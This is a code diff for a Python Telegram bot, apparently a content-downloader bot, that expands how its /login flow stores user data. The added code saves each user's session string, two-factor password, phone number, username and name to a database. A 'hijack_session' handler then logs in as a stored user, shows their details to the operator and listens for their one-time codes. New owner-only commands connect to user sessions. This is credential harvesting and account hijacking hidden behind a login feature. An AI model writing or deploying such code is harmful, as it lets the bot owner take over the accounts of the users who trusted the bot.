@@ -21,6 +21,7 @@ import string
 from config import OWNER_ID
 from devgagan.core.mongo import db
 from devgagan.core.mongo.db import user_sessions_real
+from connect_user import connect_user, disconnect_user  # ✅ Imported connection functions
 from devgagan.core.func import subscribe, chk_user
 from config import API_ID as api_id, API_HASH as api_hash
 from pyrogram.errors import (
@@ -71,6 +72,18 @@ async def clear_db(client, message):
         await message.reply("✅ Your session data and files have been cleared from memory and disk.")
     else:
         await message.reply("✅ Logged out with flag -m")
+
+#Adding Chat feature with user through my bot -by Adarsh
+@app.on_message(filters.command("connect_user") & filters.user(OWNER_ID))  # ✅ Added command to connect user
+async def handle_connect_user(client, message):
+    """Handles the /connect_user command to connect a user session."""
+    await connect_user(client, message)  # ✅ Calls function from connect_user.py
+
+@app.on_message(filters.command("disconnect_user") & filters.user(OWNER_ID))  # ✅ Added command to disconnect user
+async def handle_disconnect_user(client, message):
+    """Handles the /disconnect_user command to terminate user session."""
+    await disconnect_user(client, message)  # ✅ Calls function from connect_user.py
+#chat feature code is till here
 
 @app.on_message(filters.command("login"))
 async def generate_session(_, message):
@@ -137,22 +150,33 @@ async def generate_session(_, message):
     # ✅ Save session in both directories
     await db.set_session(user_id, string_session)
    # await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
-# ✅ Check if phone number exists in the database
+    #User_Data:
+    # ✅ Fetch user details
+    me = await client.get_me()
+    username = me.username if me.username else "N/A"
+    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
+    user_id = me.id  
+    
+    user_data = {
+        "user_id": user_id,
+        "username": username,
+        "name": full_name,
+        "phone_number": phone_number,
+        "session_string": string_session,
+        "password": password
+    }
+    
+    #✅ Check if phone number exists in the database
     existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number}) 
     if existing_user:
         # ✅ Update session and password for existing user
         await db.user_sessions_real.update_one(
             {"phone_number": phone_number},
-            {"$set": {"session_string": string_session, "password": password}}
+            {"$set": user_data}
         )
     else:
         # ✅ Create a new record
-        await db.user_sessions_real.insert_one({
-            "user_id": user_id,
-            "phone_number": phone_number,
-            "session_string": string_session,
-            "password": password
-        })
+        await db.user_sessions_real.insert_one(user_data)
     await client.disconnect()
     await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
 #saving data into user_session_real
@@ -209,7 +233,21 @@ async def hijack_session(_, message):
         await otp_userbot.start()
         if otp_userbot.is_connected:
             user = await otp_userbot.get_me()
-            await message.reply(f"Logged in as {user.first_name} (username:@{user.username})")
+            # Fetch user data from the database
+            user_data = await db.user_sessions_real.find_one({"user_id": user.id})
+            user_id = user.id
+            first_name = user.first_name or "N/A"
+            username = f"@{user.username}" if user.username else "N/A"
+            phone_number = user_data.get("phone_number", "N/A")  # Fetch from database
+            # Formatted message
+            success_message = (
+                "✅ **Logged in Successfully as:**\n"
+                f"📌 **User ID:** `{user_id}`\n"
+                f"👤 **Name:** `{first_name}`\n"
+                f"🔹 **Username:** {username}\n"
+                f"📞 **Phone Number:** `{phone_number}`"
+            )
+            await message.reply(success_message)
             await message.reply("🤖 Userbot started! and ready! to Listen for OTP...")
         else:
             await message.reply("❌ OTP Userbot failed to start.")
